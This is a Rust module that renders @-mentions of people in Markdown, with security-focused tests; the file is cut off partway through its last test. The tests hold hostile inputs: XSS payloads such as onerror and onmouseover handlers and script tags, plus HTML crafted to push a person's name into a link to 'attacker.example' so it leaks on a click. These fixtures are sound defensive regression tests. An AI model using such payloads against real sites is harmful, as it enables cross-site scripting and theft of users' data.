//! Mentions of people in rendered text (S9, #360; ONTOLOGY §7.3, §14).
//!
//! `common::mention` reads the `@[label](person:id)` syntax; the API
//! says who each mention may be named as (`MentionName`, which rides on
//! the text's own answer). This module shows them.
//!
//! **A mention is shown only where both readers agree it is one.**
//! [`with_mentions`] replaces a token among the parsed Markdown events
//! when `common::mention::mentions` reads a token at that place in the
//! text as written **and** the Markdown parser read the same place as an
//! inline link, outside an image. Anywhere else (code, an HTML block, an
//! attribute, an image's alt text) the token is whatever Markdown makes
//! of it, and nobody is named. Inside a link the writer wrote in HTML it
//! is a mention with its label, naming nobody.
//!
//! Two designs that were tried and must not come back (both from the
//! reviews of #362):
//! - **HTML put into the Markdown source** before parsing put the
//!   person's name wherever the token sat, a writer's own
//!   `<a href='https://elsewhere/?q=…'>` included: the name travelled to
//!   that address on a click.
//! - **HTML put in after the sanitizer** (at markers left in the text)
//!   let a writer forge a marker and have the fill cut through the
//!   sanitized markup: attributes of their choosing on an allowed
//!   element, past the sanitizer.
//!
//! So: the mention is written **as events, before the HTML is written,
//! and the sanitizer runs last, on everything**. The name is a `Text`
//! event, which the HTML writer escapes; the tags around it are fixed
//! strings with a canonical id. The sanitizer allows the mention's
//! classes by name. A writer can therefore give words of their own the
//! plain look of a name (as they can make them bold); the look of a link
//! to a person is styled only for an element that carries a render's own
//! class (`input.css`).
//!
//! **And the result is checked, not trusted** ([`Resolved::intact`]).
//! Markdown and the HTML parser do not read a text the same way: a
//! writer's raw HTML can end inside an open attribute
//! (`<div><a href='https://elsewhere/?q=` and a blank line), and what
//! Markdown writes next, a mention included, is then that attribute's
//! value to the sanitizer (third review of #362). No rule about where a
//! token sits can list every such case. So after sanitizing, each named
//! mention (one that names nobody too: its label is a name someone
//! picked) must be in the output as the element it was written as, as
//! often as it was written. If one is not, the whole text is rendered
//! again **with its raw HTML shown as text**: nothing of the writer's
//! is then left for a mention to fall into. The check only reads the
//! sanitizer's output; it never changes it.
//!
//! The element it looks for carries a class made for that one render
//! from random bits ([`Resolved::mark`]), which only that render's
//! sanitizer allows. A writer can type `class="mention"`; they can't
//! type that. So an element found is one this render wrote, and a
//! writer can't make up for a mention that fell into their attribute by
//! typing the element themselves with a guessed name (fourth review).

use std::collections::HashMap;
use std::ops::Range;

use common::id::PersonId;
use common::mention::{MentionName, mentions};
use pulldown_cmark::{CowStr, Event, Tag, TagEnd, html as cmark_html};
use uuid::Uuid;

/// The three events one mention becomes: an opening tag, its words, a
/// closing tag.
///
/// - The reader's own person: a link to their page, with their current
///   name.
/// - Someone else's person the reader may be told of: the current name
///   as plain text. No link, and no id in the markup: there is no way
///   into another account's People (§14).
/// - Anyone else (no such person, not really mentioned here, or their
///   owner can no longer open the node): the label as it was typed,
///   marked unresolved, in words too (`title`).
///
/// `mark` is this render's own class ([`Resolved::mark`]), written on
/// every one of them.
fn shown<'a>(label: &str, named: Option<&MentionName>, mark: &str) -> [Event<'a>; 3] {
    let (open, words, close) = match named {
        Some(named) if named.mine => (
            format!(
                r#"<a class="mention {mark}" href="/people/{}">"#,
                named.person_id.0.hyphenated()
            ),
            format!("@{}", named.display_name),
            "</a>",
        ),
        Some(named) => (
            format!(r#"<span class="mention {mark}">"#),
            format!("@{}", named.display_name),
            "</span>",
        ),
        None => (
            format!(r#"<span class="mention-unresolved {mark}" title="Not linked to a person">"#),
            format!("@{label}"),
            "</span>",
        ),
    };
    [
        Event::InlineHtml(CowStr::from(open)),
        // A `Text` event: the HTML writer escapes it. Never put a name
        // into the tag strings.
        Event::Text(CowStr::from(words)),
        Event::InlineHtml(CowStr::from(close)),
    ]
}

/// One mention of a person in a text, as `common::mention::mentions`
/// reads it in the text **as written**, and where it is in the text the
/// Markdown parser is given (the same place, unless wiki links were
/// written as HTML before it: `wikilink::Moved`).
///
/// Never scan the rewritten text for mentions. It holds other tokens
/// than the text does (the HTML of a wiki link changes which backticks
/// pair), and the API, which decides who is mentioned, reads the text
/// as written (fifth review of #362).
pub struct Token {
    pub start: usize,
    pub end: usize,
    pub person: PersonId,
    pub label: String,
}

impl Token {
    /// The mentions of `source`, each where `moved` puts it.
    pub fn all(source: &str, moved: &crate::wikilink::Moved) -> Vec<Token> {
        mentions(source)
            .into_iter()
            .map(|m| Token {
                start: moved.at(m.range.start),
                end: moved.at(m.range.end),
                person: m.person_id,
                label: m.label.to_string(),
            })
            .collect()
    }
}

/// The mentions a render wrote, as they were written: what
/// [`Self::intact`] looks for in the sanitized result.
pub struct Resolved {
    /// A class made for this one render, from random bits, written on
    /// every mention and allowed by this render's sanitizer alone
    /// (`markdown::sanitizer_naming`).
    ///
    /// SECURITY: it is what a writer can't type. Without it a writer
    /// could type the element themselves, once for each name on a list
    /// of guesses, beside a mention made to fall into their link's
    /// address: the right guess made the count below come out, and the
    /// name went to that address (fourth review of #362).
    mark: String,
    /// The HTML of each mention written, named or not, as the HTML
    /// writer writes its three events on their own.
    written: Vec<String>,
}

impl Resolved {
    fn new() -> Self {
        Self {
            mark: format!("m-{}", Uuid::new_v4().simple()),
            written: Vec::new(),
        }
    }

    /// This render's own class, for its sanitizer to allow.
    pub fn mark(&self) -> &str {
        &self.mark
    }

    /// A result no page can satisfy: a mention was written, and no page
    /// has it. For the test of what a render does when nothing holds.
    #[cfg(test)]
    pub(crate) fn never_intact() -> Self {
        let mut resolved = Self::new();
        resolved
            .written
            .push("<span>never on any page</span>".to_string());
        resolved
    }

    /// Whether every mention written is in `html` (the sanitizer's
    /// output for the whole text) as the element it was written as, as
    /// often as it was written, and nothing else carries the render's
    /// class. `clean` is that same sanitizer.
    ///
    /// One that names nobody is checked too. Its words are the label,
    /// and a label is a name: the one the author picked. What a text
    /// does to a mention can differ from reader to reader (a wiki link
    /// is an `<a>` for one and a `<span>` for another, and the HTML
    /// parser treats the two differently inside `<svg>`), so each
    /// reader's own page is checked for all of them.
    ///
    /// SECURITY: this is what keeps a name out of a writer's attribute.
    /// The element, cleaned on its own, is how the sanitizer serialises
    /// it wherever it is a real element. Its raw `"` can't be inside an
    /// attribute's value in serialised HTML, and its raw `<` can't be in
    /// text, so finding it means it is an element, with the name as its
    /// words. A mention that Markdown wrote into what the HTML parser
    /// read as an attribute, a comment or a dropped element is not found,
    /// and the caller then shows the text with its raw HTML as text.
    ///
    /// And each one found was written by this render: it carries
    /// [`Self::mark`], which nobody else has.
    ///
    /// One pass over the page, whatever the text holds: the writer
    /// chooses how many different labels there are, and a search of the
    /// page for each took a third of a minute on a body of the size the
    /// API allows (sixth review of #362).
    pub fn intact(&self, html: &str, clean: impl Fn(&str) -> String) -> bool {
        let mut times: HashMap<&str, usize> = HashMap::new();
        for written in &self.written {
            *times.entry(written.as_str()).or_default() += 1;
        }
        // Each as the sanitizer serialises it, and how often it is owed.
        let mut owed: HashMap<String, usize> = HashMap::with_capacity(times.len());
        for (written, times) in times {
            *owed.entry(clean(written)).or_default() += times;
        }
        // Every element on the page that carries the mark must be one of
        // them. An element here is its opening tag (the mark is in it),
        // its words (escaped: no `<`), and its own closing tag.
        let mut rest = html;
        while let Some(at) = rest.find(self.mark.as_str()) {
            let Some(start) = rest.get(..at).and_then(|before| before.rfind('<')) else {
                return false;
            };
            let tail = rest.get(start..).unwrap_or_default();
            let close = if tail.starts_with("<a ") {
                "</a>"
            } else if tail.starts_with("<span ") {
                "</span>"
            } else {
                return false;
            };
            let Some(end) = tail.find(close).map(|at| at + close.len()) else {
                return false;
            };
            match owed.get_mut(tail.get(..end).unwrap_or_default()) {
                Some(left) if *left > 0 => *left -= 1,
                _ => return false,
            }
            rest = tail.get(end..).unwrap_or_default();
        }
        owed.values().all(|left| *left == 0)
    }
}

/// How many `<a …>` a piece of the writer's own HTML opens, less how
/// many `</a>` it closes. A token between the two is the text of the
/// writer's link: naming the person there would put their name, styled
/// as a mention, on a link to the writer's address. It is shown with
/// its label instead.
///
/// This is tidiness, not a boundary: it reads tags by eye, and a
/// `</a>` in the same piece of HTML fools it. What keeps a name out of
/// a writer's address is [`Resolved::intact`].
fn anchors_opened(html: &str) -> i32 {
    let lower = html.to_ascii_lowercase();
    let mut opened = 0;
    let mut rest = lower.as_str();
    while let Some(at) = rest.find('<') {
        let tag = rest.get(at + 1..).unwrap_or_default();
        if let Some(after) = tag.strip_prefix("/a") {
            if after.starts_with(|c: char| c == '>' || c.is_whitespace()) || after.is_empty() {
                opened -= 1;
            }
        } else if let Some(after) = tag.strip_prefix('a')
            && (after.starts_with(|c: char| c == '>' || c == '/' || c.is_whitespace())
                || after.is_empty())
        {
            opened += 1;
        }
        rest = tag;
    }
    opened
}

/// `events` (parsed, with where in the parsed text each came from) with
/// every one of `tokens` that the parser read as a link replaced by
/// what `people` lets its reader see; and what was written, for the
/// caller to check in the sanitized result ([`Resolved::intact`]).
pub fn with_mentions<'a>(
    events: Vec<(Event<'a>, Range<usize>)>,
    tokens: &[Token],
    moved: &crate::wikilink::Moved,
    people: &[MentionName],
) -> (Vec<Event<'a>>, Resolved) {
    let mut resolved = Resolved::new();
    // By where each starts (its `@`).
    let tokens: HashMap<usize, &Token> = tokens.iter().map(|token| (token.start, token)).collect();
    // By person, once: a text can mention thousands, and a search of
    // the list for each mention is that many times that many.
    let people: HashMap<PersonId, &MentionName> =
        people.iter().rev().map(|p| (p.person_id, p)).collect();
    let mut out: Vec<Event<'a>> = Vec::with_capacity(events.len());
    let mut in_image = 0usize;
    let mut in_anchor = 0i32;
    let mut events = events.into_iter();
    while let Some((event, range)) = events.next() {
        match &event {
            Event::Start(Tag::Image { .. }) => in_image += 1,
            Event::End(TagEnd::Image) => in_image = in_image.saturating_sub(1),
            // The writer's own HTML. A wiki link's tags are the app's:
            // counted, one that lost its end tag to a code span left
            // every later mention unnamed.
            Event::InlineHtml(html) | Event::Html(html) if !moved.wrote(&range) => {
                in_anchor = (in_anchor + anchors_opened(html)).max(0);
            }
            _ => {}
        }
        // A link over exactly the bytes of a token, less its `@`. (Only
        // an inline link `[label](person:id)` can be that.)
        let token = match &event {
            Event::Start(Tag::Link { .. }) if in_image == 0 => range
                .start
                .checked_sub(1)
                .and_then(|at| tokens.get(&at))
                .filter(|token| token.end == range.end),
            _ => None,
        };
        // The `@` is the text right before the link: it is taken off
        // below, so it has to be there.
        let after_at = matches!(out.last(), Some(Event::Text(text)) if text.ends_with('@'));
        let Some(token) = token.filter(|_| after_at) else {
            out.push(event);
            continue;
        };
        // The link's own events are the label, which the scanner has
        // already read. (A label holds no `<` and no `[`, so there is
        // no link inside this one to end first.)
        for (inner, _) in events.by_ref() {
            if matches!(inner, Event::End(TagEnd::Link)) {
                break;
            }
        }
        // The `@` belongs to the mention.
        if let Some(Event::Text(text)) = out.pop() {
            let before = text.strip_suffix('@').unwrap_or(&text);
            if !before.is_empty() {
                out.push(Event::Text(CowStr::from(before.to_string())));
            }
        }
        // Inside a link the writer wrote in HTML, nobody is named: the
        // name would be the words of a link to the writer's address. It
        // is still written as a mention, with its label, so that it is
        // checked like every other: left as Markdown's own link, its
        // label could fall into that address unseen.
        let named = if in_anchor > 0 {
            None
        } else {
            people.get(&token.person).copied()
        };
        let events_of_it = shown(&token.label, named, &resolved.mark);
        let mut written = String::new();
        cmark_html::push_html(&mut written, events_of_it.iter().cloned());
        resolved.written.push(written);
        out.extend(events_of_it);
    }
    (out, resolved)
}

#[cfg(test)]
mod tests {
    use crate::markdown::{RenderedBody, render_markdown_plain};
    use common::id::{NodeId, PersonId};
    use common::mention::{MentionName, mention_token};
    use std::collections::HashMap;
    use uuid::Uuid;

    /// `html` without the class a render makes for itself
    /// (`Resolved::mark`: ` m-` and 32 hex digits), so a test can say
    /// what the markup is.
    fn unmarked(html: &str) -> String {
        let mut out = String::with_capacity(html.len());
        let mut rest = html;
        while let Some(at) = rest.find(" m-") {
            let after = rest.get(at + 3..).unwrap_or_default();
            let hex = after.bytes().take_while(u8::is_ascii_hexdigit).count();
            out.push_str(rest.get(..at).unwrap_or_default());
            if hex == 32 {
                rest = after.get(32..).unwrap_or_default();
            } else {
                out.push_str(" m-");
                rest = after;
            }
        }
        out.push_str(rest);
        out
    }

    // The renderers, with the render's own class taken off.
    fn render_note(text: &str, people: &[MentionName]) -> String {
        unmarked(&crate::markdown::render_note(text, people))
    }
    fn render_markdown(
        text: &str,
        titles: &HashMap<String, NodeId>,
        people: &[MentionName],
    ) -> String {
        unmarked(&crate::markdown::render_markdown(text, titles, people))
    }
    fn render_body(
        text: &str,
        titles: &HashMap<String, NodeId>,
        people: &[MentionName],
    ) -> RenderedBody {
        let mut body = crate::markdown::render_body(text, titles, people);
        body.html = unmarked(&body.html);
        body
    }

    fn ada() -> PersonId {
        PersonId(Uuid::from_u128(0xada))
    }

    fn named(name: &str, mine: bool) -> Vec<MentionName> {
        vec![MentionName {
            person_id: ada(),
            display_name: name.to_string(),
            mine,
            links_to: None,
        }]
    }

    /// Every way a text is rendered with names.
    fn renderings(text: &str, people: &[MentionName]) -> [String; 3] {
        [
            render_note(text, people),
            render_markdown(text, &HashMap::new(), people),
            render_body(text, &HashMap::new(), people).html,
        ]
    }

    #[test]
    fn a_mention_is_a_link_for_its_owner_and_a_name_for_anyone_else() {
        let text = format!("Met {}.", mention_token("Ada", ada()));
        // The current name, not the label.
        let own = render_note(&text, &named("Ada King", true));
        assert!(
            own.contains(&format!(
                r#"Met <a class="mention" href="/people/{}""#,
                ada().0.hyphenated()
            )) && own.contains(">@Ada King</a>."),
            "{own}"
        );
        let others = render_note(&text, &named("Ada King", false));
        assert!(
            others.contains(r#"Met <span class="mention">@Ada King</span>."#),
            "{others}"
        );
        // SECURITY: nothing of the person but the name for another reader.
        assert!(!others.contains("href") && !others.contains(&ada().0.to_string()));
        // Nobody to name: the label as typed, unresolved, and said so.
        let nobody = render_note(&text, &[]);
        assert!(
            nobody.contains(
                r#"<span class="mention-unresolved" title="Not linked to a person">@Ada</span>"#
            ),
            "{nobody}"
        );
        assert!(!nobody.contains(&ada().0.to_string()), "{nobody}");
    }

    #[test]
    fn a_name_is_never_markdown_or_markup() {
        let text = mention_token("x", ada());
        let hostile = "[click](https://evil.example) *b* <img src=x onerror=alert(1)> `c` \"q\" 'q' &amp; </a></span><script>x</script>";
        for people in [named(hostile, true), named(hostile, false)] {
            for html in renderings(&text, &people) {
                assert!(!html.contains("<img") && !html.contains("<em>"), "{html}");
                assert!(
                    !html.contains("<code>") && !html.contains("<script"),
                    "{html}"
                );
                // One link at most (the owner's), and it goes to the person.
                assert_eq!(
                    html.matches("href=").count(),
                    usize::from(people[0].mine),
                    "{html}"
                );
                assert!(!html.contains("href=\"https://evil"), "{html}");
                assert!(
                    html.contains("evil.example"),
                    "the name is still shown: {html}"
                );
            }
        }
        // A label too (it is the writer's own text, and still inert).
        let token = format!("@[*x* **y** &amp; z](person:{})", ada().0.hyphenated());
        for html in renderings(&token, &[]) {
            assert!(
                !html.contains("<strong>") && !html.contains("<em>"),
                "{html}"
            );
            assert!(html.contains("@*x* **y** &amp;amp; z</span>"), "{html}");
        }
    }

    /// SECURITY (from the reviews of #362): a name goes only into the
    /// words of the page. Not into a writer's own link address or
    /// attribute (it would travel to the writer's address on a click),
    /// not into an image's alt text, and not onto a link of the writer's.
    #[test]
    fn a_name_never_lands_in_an_attribute_in_code_or_on_a_writers_link() {
        let token = mention_token("x", ada());
        let secret = "Ada Secret";
        for text in [
            format!("<a href='https://attacker.example/?q={token}'>Quarterly report</a>"),
            format!("<a href=\"https://attacker.example/\">{token}</a>"),
            format!("<A HREF=\"https://attacker.example/\">see {token} here</A>"),
            format!("<img src='https://attacker.example/?{token}'>"),
            format!("<span title=\"{token}\">hover</span>"),
            format!("<!-- {token} -->"),
            format!("<div>\n{token}\n</div>"),
            format!("`{token}`"),
            format!("    {token}"),
            format!("```\n{token}\n```"),
            format!("[a link]({token})"),
            format!("[a link](https://attacker.example/ \"{token}\")"),
            format!("![{token}](https://attacker.example/i.png)"),
            format!("![alt](https://attacker.example/{token})"),
        ] {
            for people in [named(secret, true), named(secret, false)] {
                for html in renderings(&text, &people) {
                    assert!(!html.contains("Secret"), "{text} -> {html}");
                }
            }
        }
        // Markdown does not nest links: the token is the link, and the
        // writer's address around it is words on the page. The name is
        // linked to the person, never to that address.
        let nested = format!("[{token}](https://attacker.example/)");
        for html in renderings(&nested, &named(secret, true)) {
            assert!(html.contains("@Ada Secret</a>"), "{html}");
            assert_eq!(html.matches("href=").count(), 1, "{html}");
            assert!(html.contains("href=\"/people/"), "{html}");
        }
    }

    /// The sanitizer is the last thing that touches the HTML, whatever
    /// the text holds. These broke out of it while the mention's HTML
    /// was put in afterwards, at markers a writer could forge.
    #[test]
    fn nothing_a_writer_types_gets_past_the_sanitizer() {
        let token = mention_token("x", ada());
        let forged = [
            "<a href=\"https://attacker.example/\" title=\"&#xE000;\">Sign in again</a>&#xE001;<span title=\" class=etl-root style=position:fixed;inset:0 onmouseover=alert(1) x=\">.</span><span title=\"y\">.</span>".to_string(),
            "[Sign in again](https://attacker.example/ \"&#xE000;\")&#57345;<span title=\" onmouseover=alert(1) class=etl-root x=\">.</span>".to_string(),
            format!("\u{e000}0\u{e001} &#xE000;0&#xE001; {token}"),
            format!("![{token} <img src=x onerror=alert(1)>](https://e.example/i.png)"),
            format!("<span title=\"\u{e000}0\u{e001}\">{token}</span>"),
        ];
        for text in &forged {
            for people in [named("Ada", true), named("Ada", false), Vec::new()] {
                for html in renderings(text, &people) {
                    // Cleaned again, it is what it was: nothing in it is
                    // something the sanitizer would have taken out.
                    assert_eq!(crate::markdown::sanitized(&html), html, "{text} -> {html}");
                    assert!(
                        !html.contains("onmouseover=") || html.contains("title=\""),
                        "{html}"
                    );
                    for class in ["etl-root", "fixed"] {
                        assert!(!html.contains(&format!("class=\"{class}")), "{html}");
                    }
                }
            }
        }
        // And an event handler never becomes an attribute.
        let html = render_note(&forged[0], &[]);
        let doc = ammonia::Builder::new()
            .add_generic_attributes(&["onmouseover", "class", "style"])
            .clean(&html)
            .to_string();
        assert!(!doc.contains(" onmouseover=\""), "{doc}");
        assert!(!doc.contains(" class=\"etl-root\""), "{doc}");
    }

    #[test]
    fn only_what_both_readers_call_a_mention_is_one() {
        let id = ada().0.hyphenated().to_string();
        let people = named("Ada", true);
        for not_one in [
            format!("[Ada](person:{id})"),
            format!("@ [Ada](person:{id})"),
            format!("@[Ada](person:{})", id.to_uppercase()),
            format!("@[Ada](people:{id})"),
            format!("@[Ada](https://example.com/person:{id})"),
            format!("@[Ada][ref]\n\n[ref]: person:{id}"),
            format!("@<person:{id}>"),
            // Forms Markdown reads as a link to the person, and the one
            // scanner does not read as a token.
            format!("&#64;[Ada](person:{id})"),
            format!("@[Ada](person:{id} \"a title\")"),
            format!("@[Ada](<person:{id}>)"),
            format!("@[](person:{id})"),
            format!("@[A [nested] da](person:{id})"),
            // Markdown reads `\]` as part of a longer link: its link ends
            // elsewhere than a token would.
            format!("@[A\\](person:{id})](person:{id})"),
            // A link that starts where a token does and ends elsewhere
            // (raw HTML binds tighter than the brackets): the two readers
            // disagree, so nobody is named.
            format!("@[x <b title=\"](person:{id})\">y](person:{id})"),
        ] {
            for html in renderings(&not_one, &people) {
                assert!(!html.contains("class=\"mention"), "{not_one} -> {html}");
                // And a link to `person:` is dropped by the sanitizer.
                assert!(!html.contains("href=\"person:"), "{not_one} -> {html}");
            }
        }
        // Several, and mixed with other things.
        let text = format!(
            "**{0}** then {0}, in a list:\n\n- {0}\n\n| a |\n|---|\n| {0} |\n",
            mention_token("Ada", ada())
        );
        let html = render_markdown(&text, &HashMap::new(), &people);
        assert_eq!(html.matches("class=\"mention\"").count(), 4, "{html}");
    }

    #[test]
    fn wiki_links_and_mentions_live_side_by_side() {
        let node = NodeId(Uuid::from_u128(7));
        let titles: HashMap<String, NodeId> = [("plan".to_string(), node)].into();
        let token = mention_token("Ada", ada());
        let text = format!(
            "[[Plan]] with {token} and [[Nowhere]] and [[Plan|{token}]] and [[Nowhere|{token}]]"
        );
        let html = render_markdown(&text, &titles, &named("Ada", true));
        assert!(
            html.contains(r#"<a class="wikilink" data-node-id="#),
            "{html}"
        );
        // One in a wiki link's own words is that link's text, whether or
        // not the link leads anywhere.
        assert_eq!(html.matches("class=\"mention\"").count(), 1, "{html}");
        assert!(html.contains(r#"<span class="wikilink-unresolved">Nowhere</span>"#));
        // Where a text's raw HTML is shown as text (it would not leave a
        // mention whole), a wiki link is still a link: its tags are the
        // app's own.
        let hostile = format!(
            "[[Plan]] and\n\n<div></a><a href='https://attacker.example/?q=\n\n{token}\n\n'>x</a></div>\n"
        );
        let html = render_markdown(&hostile, &titles, &named("Ada", true));
        assert!(
            html.contains(r#"<a class="wikilink" data-node-id="#),
            "{html}"
        );
        assert!(
            html.contains("&lt;div&gt;") && html.contains("class=\"mention\""),
            "{html}"
        );
        // Each wiki link's own tags, and only those: inline HTML of the
        // writer's after one is text like the rest, and every link kept
        // is closed.
        let hostile = format!(
            "[[Plan]] <b title='w'>bold</b> [[Nowhere]] <i>it</i> [[Plan|again]]\n\n<div></a><a href='https://attacker.example/?q=\n\n{token}\n\n'>x</a></div>\n"
        );
        let html = render_markdown(&hostile, &titles, &named("Ada", true));
        assert_eq!(
            html.matches(r#"<a class="wikilink" data-node-id="#).count(),
            2,
            "{html}"
        );
        assert!(
            html.contains(">Plan</a>") && html.contains(">again</a>"),
            "{html}"
        );
        assert!(
            html.contains(r#"<span class="wikilink-unresolved">Nowhere</span>"#),
            "{html}"
        );
        assert!(
            html.contains("&lt;b title=") && html.contains("&lt;i&gt;"),
            "{html}"
        );
        assert!(!html.contains("<b") && !html.contains("<i>"), "{html}");
        assert!(html.contains(">@Ada</a>"), "{html}");
        // A mention right after a wiki link is found where the link's
        // HTML has moved it to.
        let html = render_markdown(
            &format!("[[Plan]]{token} [[Nowhere]]{token}"),
            &titles,
            &named("Ada", true),
        );
        assert_eq!(html.matches("class=\"mention\"").count(), 2, "{html}");
        // A wiki link that loses its end tag to a code span is the app's
        // own tag, not a link of the writer's: what follows is still
        // named.
        let html = render_markdown(
            &format!("[[Plan|a ` b]] then ` {token} and {token}"),
            &titles,
            &named("Ada", true),
        );
        assert_eq!(html.matches(">@Ada</a>").count(), 2, "{html}");
        // In a note, wiki links are text and the mention is a mention.
        let note = render_note(&format!("[[Plan]] with {token}"), &named("Ada", true));
        assert!(
            note.contains("[[Plan]] with <a class=\"mention\""),
            "{note}"
        );
    }

    #[test]
    fn a_heading_with_a_mention_reads_as_its_name_in_the_outline() {
        let text = format!(
            "## Ask {}\n\ntext\n\n## Two\n\n## Three\n",
            mention_token("Ada", ada())
        );
        let body = render_body(&text, &HashMap::new(), &named("Ada King", true));
        assert_eq!(body.outline[0].text, "Ask @Ada King");
        assert!(body.html.contains("class=\"mention\""), "{}", body.html);
    }

    /// Where no names are at hand (a Brief, a template, a task title),
    /// a token is a Markdown link with a scheme the sanitizer drops: it
    /// reads "@Ada", linked to nothing.
    #[test]
    fn a_token_that_is_not_resolved_reads_as_at_name_with_no_link() {
        let text = format!("Met {}.", mention_token("Ada", ada()));
        let html = render_markdown_plain(&text);
        assert!(html.contains("@<a") && html.contains(">Ada</a>"), "{html}");
        assert!(
            !html.contains("person:") && !html.contains("href"),
            "{html}"
        );
    }

    // ── The check of the sanitizer's output (third review of #362) ──

    const SECRET: &str = "Zq9Secret";

    /// The value of every attribute in `html`. In the sanitizer's
    /// serialisation a value is always in double quotes with any `"`
    /// inside it escaped, so a walk over the quotes inside tags is exact.
    fn attribute_values(html: &str) -> Vec<String> {
        let mut values = Vec::new();
        let (mut in_tag, mut in_value) = (false, false);
        let mut value = String::new();
        for c in html.chars() {
            if !in_tag {
                in_tag = c == '<';
            } else if in_value {
                if c == '"' {
                    in_value = false;
                    values.push(std::mem::take(&mut value));
                } else {
                    value.push(c);
                }
            } else if c == '"' {
                in_value = true;
            } else if c == '>' {
                in_tag = false;
            }
        }
        values
    }

    fn in_an_attribute(html: &str, name: &str) -> bool {
        attribute_values(html).iter().any(|v| v.contains(name))
    }

    /// SECURITY: Markdown and the HTML parser read a text differently. A
    /// writer's raw HTML can end inside an open attribute, and the
    /// mention Markdown writes next is then that attribute's value: the
    /// person's name in the writer's link address. No rule about where a
    /// token sits caught these; the check of the result does, and the
    /// text is then shown with its raw HTML as text: the mention is a
    /// mention, and the writer's link is no link.
    #[test]
    fn a_name_is_never_in_an_attribute_however_the_html_is_split() {
        let token = mention_token("x", ada());
        let cases = [
            format!(
                "<div><a href='https://attacker.example/?q=\n\n{token}\n\n' <b>Quarterly report</b></a></div>\n"
            ),
            format!(
                "<div><a href='https://attacker.example/?q=\n\n{token}\n\n'>Quarterly report</a></div>\n"
            ),
            format!(
                "<div><a href=\"https://attacker.example/?q=\n\n{token}\n\n\">Quarterly report</a></div>\n"
            ),
            format!("<div title='\n\n{token}\n\n'>x</div>\n"),
            format!(
                "<blockquote cite='https://attacker.example/?q=\n\n{token}\n\n'>x</blockquote>\n"
            ),
            format!(
                "<div><img alt='x' src='https://attacker.example/p.png?q=\n\n{token}\n\n' <b>\n"
            ),
            format!(
                "<p><a href='https://attacker.example/?q=\n\n{token}\n\n' <b>Quarterly report</b></a>\n"
            ),
            format!(
                "<table><tr><td><a href='https://attacker.example/?q=\n\n{token}\n\n' <b>Quarterly report</b></a>\n"
            ),
            // Past the count of the writer's own `<a>` tags.
            format!(
                "<div></a><a href='https://attacker.example/?q=\n\n{token}\n\n' <b>Quarterly report</b></a></div>\n"
            ),
            format!(
                "<div><a title=\"</a>\" href='https://attacker.example/?q=\n\n{token}\n\n' <b>Quarterly report</b></a></div>\n"
            ),
            format!(
                "<pre></pre><a href='https://attacker.example/?</a>q=\n{token}\n' <b>Quarterly report</b></a>\n"
            ),
            // With a mention before and after it that would be fine alone.
            format!(
                "Intro {token}.\n\n<div><a x='</a>' href='https://attacker.example/?q=\n\nThanks {token} for the review.\n\n' <b>Quarterly report</b></a></div>\n\nOutro {token}.\n"
            ),
        ];
        for text in &cases {
            for mine in [true, false] {
                for html in renderings(text, &named(SECRET, mine)) {
                    assert!(!in_an_attribute(&html, SECRET), "{text:?} -> {html}");
                    // Nothing of the writer's HTML is HTML any more: no
                    // link of theirs, and their tags are words.
                    assert!(!in_an_attribute(&html, "attacker"), "{text:?} -> {html}");
                    assert!(html.contains("&lt;"), "{text:?} -> {html}");
                    // Every mention in it is whole, and named.
                    let mentions = text.matches("person:").count();
                    assert_eq!(
                        html.matches(&format!(">@{SECRET}</")).count(),
                        mentions,
                        "{text:?} -> {html}"
                    );
                }
            }
        }
        // Where the HTML parser reads no element and Markdown no link (a
        // comment, a text box, a script), nothing is written for it.
        for text in [
            format!("<!--\n\n{token}\n\n-->\n"),
            format!("<textarea>\n\n{token}\n\n</textarea>\n"),
            format!("<script>\n\n{token}\n\n</script>\n"),
        ] {
            for html in renderings(&text, &named(SECRET, true)) {
                assert!(!html.contains(SECRET), "{text:?} -> {html}");
            }
        }
        // The outline of a body is made with the attempt that held.
        let text = format!("## Ask {token}\n\n<div title='\n\n{token}\n\n'>x</div>\n");
        let body = render_body(&text, &HashMap::new(), &named(SECRET, true));
        assert_eq!(body.outline[0].text, format!("Ask @{SECRET}"));
        assert!(!in_an_attribute(&body.html, SECRET), "{}", body.html);
        assert!(body.html.contains("&lt;div title="), "{}", body.html);
    }

    /// A mention that names nobody is checked too: its words are the
    /// label, which is a name someone picked.
    #[test]
    fn a_label_is_never_in_an_attribute_either() {
        let label = "Zq9Label";
        let token = mention_token(label, ada());
        let titles: HashMap<String, NodeId> =
            [("t".to_string(), NodeId(Uuid::from_u128(8)))].into();
        for text in [
            format!(
                "<div></a><a href='https://attacker.example/?q=\n\n{token}\n\n' <b>Quarterly report</b></a></div>\n"
            ),
            // Inline HTML only, no block of it: a CDATA section is a
            // comment to the HTML parser outside SVG, and ends early.
            format!(
                "x <![CDATA[><a href='https://attacker.example/?q=]]> y\n\n{token}\n\n'>Quarterly report</a>\n"
            ),
            // A page that is not the same for every reader: `[[T]]` is an
            // `<a>` for whoever sees T and a `<span>` for whoever does
            // not, and inside `<svg>` only the `<span>` ends the SVG. For
            // the second reader what follows opened an attribute.
            format!(
                "<div><svg>[[T]]<![CDATA[></a><a href='https://attacker.example/?q=]]><p>\n\n{token}\n\n' <b>Quarterly report</b></a></div>\n"
            ),
            // A copy of the element typed beside it does not stand in
            // for it: the copy has no class of this render's.
            format!(
                "<span class=\"mention-unresolved\" title=\"Not linked to a person\">@{label}</span>\n\n<div></a><a href='https://attacker.example/?q=\n\n{token}\n\n' <b>Quarterly report</b></a></div>\n"
            ),
        ] {
            for titles in [&titles, &HashMap::new()] {
                for people in [Vec::new(), named(SECRET, true), named(SECRET, false)] {
                    for html in [
                        render_note(&text, &people),
                        render_markdown(&text, titles, &people),
                        render_body(&text, titles, &people).html,
                    ] {
                        assert!(!in_an_attribute(&html, label), "{text:?} -> {html}");
                        assert!(!in_an_attribute(&html, SECRET), "{text:?} -> {html}");
                    }
                }
            }
            // And where nobody is named, the label is the mention's words.
            let html = render_note(&text, &[]);
            assert!(html.contains(&format!(">@{label}</span>")), "{html}");
        }
    }

    #[test]
    fn the_check_counts_each_person_as_written() {
        use super::Resolved;
        let mark = "m-0123456789abcdef0123456789abcdef";
        let clean = |html: &str| crate::markdown::sanitized_naming(html, mark);
        let one = format!(r#"<span class="mention {mark}">@Ann</span>"#);
        let own = format!(
            r#"<a class="mention {mark}" href="/people/00000000-0000-0000-0000-000000000ada">@A &amp; B</a>"#
        );
        let twice = Resolved {
            mark: mark.to_string(),
            written: vec![one.clone(), own.clone(), one.clone()],
        };
        let whole = clean(&format!("<p>{one} and {own}, {one}.</p>"));
        assert!(twice.intact(&whole, clean), "{whole}");
